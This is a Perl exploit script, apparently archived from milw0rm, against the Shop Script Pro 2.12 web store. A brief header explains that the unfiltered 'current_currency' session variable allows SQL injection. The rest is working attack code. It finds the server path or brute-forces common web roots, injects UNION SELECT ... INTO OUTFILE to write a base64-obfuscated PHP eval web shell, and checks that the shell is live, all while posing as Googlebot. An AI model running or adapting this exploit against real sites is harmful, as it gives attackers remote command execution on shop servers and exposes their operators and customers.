<html><head><title>Shop Script Pro 2.12 Remote SQL Injection Exploit</title></head><pre>#!/usr/bin/perl

=about

 VENDOR
    Shop Script Pro 2.12
    (maybe other versions vulnerable too)
    http://www.shop-script.com/

 AUTHOR
    discovered &amp; written by Ams
    ax330d [doggy] gmail [dot] com
    http://www.0x416d73.name/

 VULN. DESCRIPTION
    Look in index.php at line 101.
    Variable $current_currency is set from $_SESSION[&quot;current_currency&quot;]
    which is set in &quot;/core_functions/currency_functions.php&quot; in function
    currSetCurrentCurrency() at line 17 via &quot;/includes/change_currency.php&quot;
    at line 13. This variable is not filtered.

 EXPLOIT WORK
    First exploit looks for file &quot;linkpoint.php&quot; in
    hope to find full server path. If not found, then it bruteforces
    those paths, otherwise will use found one.
    Also at this time session is being set.
    Exploit then sends POST request with SQL-Injection that tries to
    upload tiny shell. And finally checks for shell.

 REQUIREMENTS
    1. MySQL must have rights to write to file
    2. Full server path should be known
    3. magic_quotes_gpc=off

=cut

use strict;
use warnings;
use LWP::UserAgent;
use HTTP::Cookies;
use HTTP::Request::Common;

&amp;Banner;
$| = 1;
my $expl_url  = shift or &amp;Usage;
my $serv_path = shift || '';
my $def_shell = '/products_pictures/pic.php';
my $shell     = q(&lt;?php eval(base64_decode(base64_decode($_GET['cmd'])));?&gt;);
my $sql_shell = join ',', map { ord } split //, $shell;

my $cookie = HTTP::Cookies-&gt;new;
my $spider = LWP::UserAgent-&gt;new;

push @{ $spider-&gt;requests_redirectable }, 'POST';
$spider-&gt;requests_redirectable();
$spider-&gt;agent('Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)');

my @paths = qw(
    /var/www/htdocs /var/www/localhost/htdocs /var/www /var/wwww/hosting /var/www/html /var/www/vhosts
    /home/www  /home/httpd/vhosts
    /usr/local/apache/htdocs
    /www/htdocs
    /srv/www/htdocs
);

Exploit( $expl_url );

sub Exploit {

    $_ = shift;
    print &quot;\n\tExploiting:\t $_&quot;;

    chomp( $serv_path );
    my $injection;
    my ($prot , $host, $path, ) = m{(?:([^:/?#]+):)?(?://([^/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?};

    $prot ||= 'http';
    #   Trying to get /linkpoint.php to get server path
    my $req = POST &quot;$prot://$host$path/linkpoint.php&quot;,
        Content_Type =&gt; 'form-data',
        Content      =&gt; [ oid =&gt; 1, chargetotal =&gt; 1 ];
    my $res = $spider-&gt;request( $req );

    $cookie-&gt;extract_cookies( $res );
    $spider-&gt;cookie_jar( $cookie );

    if ($serv_path ne '-b') {
        $serv_path = $res-&gt;content =~ m#in\s+&lt;b&gt;(.*?)/linkpoint\.php&lt;/b&gt;\s+on#
            ? $1 
            : $serv_path;
    }
    $serv_path ||= '-b';

    if ( $serv_path ne '-b' ) {

        chomp( $serv_path );
        print &quot;\n\tFound path:\t $serv_path&quot;;

        $injection = &quot;1' UNION SELECT null,null,null,null,CHAR($sql_shell) INTO OUTFILE '$serv_path$def_shell' -- &quot;;
        my $req = POST &quot;$prot://$host$path/index.php&quot;,
            Content_Type =&gt; 'form-data',
            Content      =&gt; [ current_currency =&gt; $injection];
        $res = $spider-&gt;request( $req );

    } else {

        #   Bruteforcing path
        print &quot;\n\tStarting bruteforce...\n&quot;;

        for $serv_path ( @paths ) {

            chomp( $serv_path );
            print &quot;\tTrying path:\t $serv_path$path$def_shell\n&quot;;

            $cookie-&gt;extract_cookies( $res );
            $spider-&gt;cookie_jar( $cookie );
            $cookie-&gt;clear();

            $injection = &quot;1' UNION SELECT null,null,null,null,CHAR($sql_shell) INTO OUTFILE '$serv_path$path$def_shell' -- &quot;;
            my $req = POST &quot;$prot://$host$path/index.php&quot;,
                Content_Type =&gt; 'form-data',
                Content      =&gt; [ current_currency =&gt; $injection ];
            $res = $spider-&gt;request( $req );
        }
    }

    #   Checking for shell presence
    $req = GET &quot;$prot://$host$path$def_shell&quot;;
    $res = $spider-&gt;request( $req );
    print &quot;\n\tChecking:\t http://$host$path$def_shell&quot;;

    if ( $res-&gt;status_line =~ /200\s+OK/ ) {
        print &quot;\n\tExploited!\n\n&quot;;
    } else {
        print &quot;\n\tExploiting failed.\n\n&quot;;
    }
}

sub Usage {

    print &quot;

    Usage:\t$0 http://site.com [-b|full/server/path]

    Example:\t$0 http://localhost/ /var/www/htdocs
            $0 http://localhost/ -b
            $0 http://localhost/

    &quot;;

    exit;
}

sub Banner {

    print &quot;
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
      Shop Script Pro 2.12 Perl exploit
    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    &quot;;
}

# milw0rm.com [2009-06-08]</pre></html>